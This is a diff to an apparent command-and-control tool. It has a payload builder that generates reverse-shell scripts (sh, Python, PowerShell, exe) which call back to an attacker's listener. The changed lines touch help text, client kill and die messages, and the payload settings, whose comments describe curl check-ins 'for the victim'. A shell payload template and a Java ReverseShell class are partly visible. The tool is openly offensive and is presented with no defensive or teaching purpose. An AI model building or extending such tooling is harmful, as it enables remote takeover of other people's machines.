@@ -230,7 +230,7 @@ def show_help():
     set name <name>      - Set CUSTOM script name | BLANK = DEFAULT
     set lhost <ip>       - Set the POSTSHELL IP address
     set lport <port>     - Set the POSTSHELL listening port
-    set payload <type>   - Set payload type (EX: sh, py, ps1, bat)
+    set payload <type>   - Set payload type (EX: sh, py, ps1, exe)
     set checkin <sec>    - Set the check-in wait time (in seconds)
     set killswitch <sec> - Exit payload if offline for N seconds
     options              - Show current payload configuration
@@ -316,7 +316,7 @@ def cli():
                             with lock:
                                 client_commands[client_id] = "exit"
                                 clients.pop(client_id, None)
-                            print(f"{ORANGE}[!] Sent {RED}'kill'{ORANGE} command to {client_id}{RESET}")
+                            print(f"{ORANGE}[!] Sent {RED}'kill'{ORANGE} command to {RED}'{client_id}'{ORANGE}{RESET}")
                         else:
                             print(f"{ORANGE}[!] Invalid client ID{RESET}")
                     except:
@@ -340,7 +340,7 @@ def cli():
                     with lock:
                         client_commands[selected_client] = "exit"
                         clients.pop(selected_client, None)
-                    print(f"{ORANGE}[!] Sent {RED}'die'{ORANGE} command to {selected_client}{RESET}")
+                    print(f"{ORANGE}[!] Sent {RED}'die'{ORANGE} command to {RED}'{selected_client}'{ORANGE}{RESET}")
                     selected_client = None
                 # alias dict call back
                 elif cmd.startswith("alias "):
@@ -411,11 +411,11 @@ def cli():
 ## payload builder
 PAYLOAD_COMMANDS = ["set", "generate", "back", "options", "help"]
 payload_settings = {
-    "name": "",
-    "lhost": "127.0.0.1",
-    "lport": "80",
-    "payload": "bash",
-    "checkin": "1",
+    "name": "", # defaults to IP_PORT.<payload>
+    "lhost": "127.0.0.1", # the ip your listening on
+    "lport": "80", # your listening port
+    "payload": "sh", # sh, py, ps1, exe
+    "checkin": "1", # time between curl requests for the victim
     "killswitch": "60"  # default 60 seconds
 }
 
@@ -440,7 +440,7 @@ def payload_help():
     print(f"    set name <name>      - Set CUSTOM script name | BLANK = DEFAULT")
     print(f"    set lhost <ip>       - Set the POSTSHELL IP address")
     print(f"    set lport <port>     - Set the POSTSHELL listening port")
-    print(f"    set payload <type>   - Set payload type (EX: sh, py, ps1, bat)")
+    print(f"    set payload <type>   - Set payload type (EX: sh, py, ps1, exe)")
     print(f"    set checkin <sec>    - Set the check-in wait time (in seconds)")
     print(f"    set killswitch <sec> - Exit payload if offline for N seconds")
     print(f"    options              - Show current payload configuration")
@@ -588,9 +588,9 @@ if __name__ == "__main__":
     command_loop()
 '''
 
-    elif payload_type == "bash":
-        payload_type = "sh"
-        payload_code = f'''#!/bin/bash
+    elif payload_type == "sh":
+        #payload_type = "sh" was adding moree support with bash and ash, currently on hold
+        payload_code = f'''#!/bin/sh
 
 SERVERIP="{lhost}"
 SERVERPORT="{lport}"
@@ -856,12 +856,6 @@ public class ReverseShell {{
         with open(filename, "w") as f:
             f.write(payload_code)
         print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
-
-# old file naming convention
-#    filename = f"tools/{name}.{payload_type}" if name else f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
-#    with open(filename, "w") as f:
-#        f.write(payload_code)
-#    print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
 
 
 def start_server(port):
